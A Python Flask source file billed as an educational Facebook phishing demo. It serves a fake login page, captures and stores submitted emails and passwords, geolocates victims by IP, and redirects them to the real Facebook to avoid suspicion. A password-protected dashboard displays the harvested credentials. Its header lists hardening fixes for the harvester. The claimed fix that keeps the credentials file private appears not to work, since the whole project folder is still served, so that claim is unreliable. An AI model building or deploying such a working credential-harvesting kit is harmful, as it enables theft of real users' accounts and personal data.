"""
Facebook Phishing Demo — Educational Use Only

A Flask application that demonstrates how phishing attacks work.
This is strictly for cybersecurity awareness training.

FIXES APPLIED:
- [FIX] Moved credentials.json into a 'data/' subdirectory so it is NOT
  served as a static file (the static folder is '.', which previously
  exposed credentials.json directly at http://localhost:5000/credentials.json).
- [FIX] Replaced bare `except:` with specific exception types to avoid
  swallowing KeyboardInterrupt / SystemExit.
- [FIX] Added file-locking (fcntl.flock) to prevent race conditions when
  concurrent requests read/write credentials.json simultaneously.
- [FIX] Added basic authentication to the dashboard and API routes so only
  the presenter can view captured credentials.
- [FIX] Removed the redundant /view-credentials route (duplicate of /api/credentials).
- [FIX] Added server-side input sanitization — email and password are stripped
  and length-limited before storage.
- [FIX] Changed the Flask server port to 5000 consistently (matching VS Code configs).
"""

from flask import Flask, request, redirect, jsonify, send_file
from functools import wraps
import json
import fcntl          # [FIX] For file-level locking to prevent race conditions
from datetime import datetime
import os
import requests       # Used to call external IP geolocation service
import ipaddress      # For detecting private/loopback addresses
from markupsafe import escape  # [FIX] For server-side HTML sanitization

# ---------------------------------------------------------------------------
# [FIX] Serve only the project root for static files, but store credentials
# in a 'data/' subdirectory so they are NOT publicly accessible.
# Previously, static_folder='.' meant credentials.json was served at /.
# ---------------------------------------------------------------------------
app = Flask(__name__, static_folder='.', static_url_path='')

# [FIX] Store credentials outside the static-serving root so the file
# cannot be downloaded by simply visiting /credentials.json.
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
os.makedirs(DATA_DIR, exist_ok=True)
CREDENTIALS_FILE = os.path.join(DATA_DIR, 'credentials.json')

# ---------------------------------------------------------------------------
# [FIX] Basic authentication for dashboard / API routes.
# In production, use environment variables or a secrets manager.
# ---------------------------------------------------------------------------
DASHBOARD_USERNAME = 'admin'
DASHBOARD_PASSWORD = 'demo2024'


def require_auth(f):
    """Decorator that enforces HTTP Basic Auth on protected routes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if (
            not auth
            or auth.username != DASHBOARD_USERNAME
            or auth.password != DASHBOARD_PASSWORD
        ):
            # [FIX] Return a 401 so browsers prompt for credentials
            return (
                'Unauthorized — enter dashboard credentials.',
                401,
                {'WWW-Authenticate': 'Basic realm="Dashboard"'},
            )
        return f(*args, **kwargs)
    return decorated


# ---------------------------------------------------------------------------
# [FIX] Input sanitization helper
# ---------------------------------------------------------------------------
MAX_INPUT_LENGTH = 256  # Reasonable upper bound for email/password fields


def sanitize_input(value: str) -> str:
    """Strip whitespace, limit length, and escape HTML entities.

    This prevents excessively long payloads and stored-XSS if credentials
    are ever rendered in a context without frontend escaping.
    """
    if not isinstance(value, str):
        return ''
    value = value.strip()
    value = value[:MAX_INPUT_LENGTH]
    # [FIX] Escape HTML entities server-side as a defence-in-depth measure.
    value = str(escape(value))
    return value


# ---------------------------------------------------------------------------
# Credential storage helpers
# ---------------------------------------------------------------------------

def save_credentials(email, password, ip=None, location=None):
    """Save credentials to JSON file with file-locking."""
    credentials_data = []

    # [FIX] Use specific exceptions instead of bare `except:`
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                # [FIX] Acquire a shared (read) lock before reading
                fcntl.flock(f, fcntl.LOCK_SH)
                credentials_data = json.load(f)
                fcntl.flock(f, fcntl.LOCK_UN)
        except (json.JSONDecodeError, FileNotFoundError, OSError) as e:
            # [FIX] Log the error instead of silently swallowing it
            print(f"⚠ Warning: could not read {CREDENTIALS_FILE}: {e}")
            credentials_data = []

    # Build the new entry
    entry = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat(),
    }
    if ip:
        entry['ip'] = ip
    if location:
        entry['location'] = location
    credentials_data.append(entry)

    # [FIX] Acquire an exclusive (write) lock before writing
    with open(CREDENTIALS_FILE, 'w') as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        json.dump(credentials_data, f, indent=2)
        fcntl.flock(f, fcntl.LOCK_UN)


def clear_credentials():
    """Clear all stored credentials."""
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route('/')
def index():
    """Serve the phishing login page."""
    return send_file('index.html')


@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission — capture and store credentials."""
    # [FIX] Sanitize inputs before storing them
    email = sanitize_input(request.form.get('email', ''))
    password = sanitize_input(request.form.get('password', ''))

    # Client IP (respect X-Forwarded-For if behind a reverse proxy)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    location = None

    # Attempt geolocation for non-local IPs
    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_loopback or addr.is_private:
            location = 'Local network'
        else:
            # Free geolocation API — no key required
            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                pieces = [
                    data[field]
                    for field in ('city', 'regionName', 'country')
                    if data.get(field)
                ]
                if pieces:
                    location = ", ".join(pieces)
    except (ValueError, requests.RequestException) as e:
        # [FIX] Specific exceptions — log instead of silently ignoring
        print(f"⚠ Geolocation lookup failed for IP {ip}: {e}")
        location = None

    # Save credentials (only if both fields are non-empty after sanitization)
    if email and password:
        save_credentials(email, password, ip=ip, location=location)
        print(f"✓ Credentials captured: {email} (ip={ip} location={location})")

    # Redirect victim to the real Facebook so they don't suspect anything
    return redirect('https://www.facebook.com')


# [FIX] Removed the redundant /view-credentials route.
# It duplicated /api/credentials with a slightly different response format.


@app.route('/dashboard')
@require_auth  # [FIX] Dashboard is now protected by Basic Auth
def dashboard():
    """Live credentials dashboard for presentation."""
    return send_file('dashboard.html')


@app.route('/api/credentials', methods=['GET'])
@require_auth  # [FIX] API is now protected by Basic Auth
def api_credentials():
    """API endpoint for dashboard to fetch credentials."""
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                fcntl.flock(f, fcntl.LOCK_SH)
                credentials = json.load(f)
                fcntl.flock(f, fcntl.LOCK_UN)
        except (json.JSONDecodeError, FileNotFoundError, OSError):
            credentials = []
        return jsonify({
            'count': len(credentials),
            'credentials': credentials,
        })
    return jsonify({
        'count': 0,
        'credentials': [],
    })


@app.route('/api/clear-credentials', methods=['POST'])
@require_auth  # [FIX] Clear route now also requires auth
def api_clear():
    """Clear all credentials."""
    clear_credentials()
    return jsonify({'status': 'success', 'message': 'All credentials cleared'})


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    print("=" * 50)
    print("Facebook Phishing Demo — Educational Use Only")
    print("=" * 50)
    print(f"\n▶ Server running on http://localhost:5000")
    print(f"▶ Login page:       http://localhost:5000/")
    print(f"▶ Live Dashboard:   http://localhost:5000/dashboard")
    print(f"▶ Credentials API:  http://localhost:5000/api/credentials")
    print(f"▶ Credentials file: {CREDENTIALS_FILE}")
    print(f"\n🔒 Dashboard credentials: {DASHBOARD_USERNAME} / {DASHBOARD_PASSWORD}\n")
    # [FIX] Port set to 5000 — consistent with .vscode/launch.json
    app.run(debug=False, port=5000)
